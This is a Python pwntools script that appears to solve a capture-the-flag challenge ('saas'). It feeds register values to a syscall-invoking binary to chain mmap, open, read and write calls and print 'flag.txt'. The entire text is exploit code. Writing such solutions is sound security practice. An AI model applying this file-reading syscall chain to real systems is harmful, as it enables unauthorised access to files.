from pwn import *

#p = remote("jh2i.com", 50016)

p = gdb.debug("./saas", """
c
""")


#mmap
p.sendline("9")		#rax
p.sendline("0")		#rdi
p.sendline("128")	#rsi
p.sendline("3")		#rdx
p.sendline("34")	#r10
p.sendline("0")		#r9
p.sendline("-1")	#r8

p.recvuntil("Rax: 0x")
addr = str(p.recvuntil("\n")[:-1])[2:-1]
addr = str(int(addr,16))
print("Heap address ="+addr)

#read
p.sendline("0")		#rax
p.sendline("0")		#rdi
p.sendline(addr)	#rsi
p.sendline("9")		#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.sendline("flag.txt"+'\x00')
p.recvuntil("Rax: 0x")

#open
p.sendline("2")		#rax
p.sendline(addr)	#rdi
p.sendline("0")		#rsi
p.sendline("420")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8

p.recvuntil("Rax: 0x")
fd = str(p.recvuntil("\n")[:-1])[2:-1]
fd = str(int(fd,16))
print("File descriptor ="+fd)

#read
p.sendline("0")		#rax
p.sendline(fd)		#rdi
p.sendline(addr)	#rsi
p.sendline("64")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.recvuntil("Rax: 0x")

#write
p.sendline("1")		#rax
p.sendline("1")		#rdi
p.sendline(addr)	#rsi
p.sendline("64")	#rdx
p.sendline("0")		#r10
p.sendline("0")		#r9
p.sendline("0")		#r8
p.recvuntil("r8 (decimal):")	#we can't read untill "Rax: 0x" because the flag is printed before that happen


p.interactive()
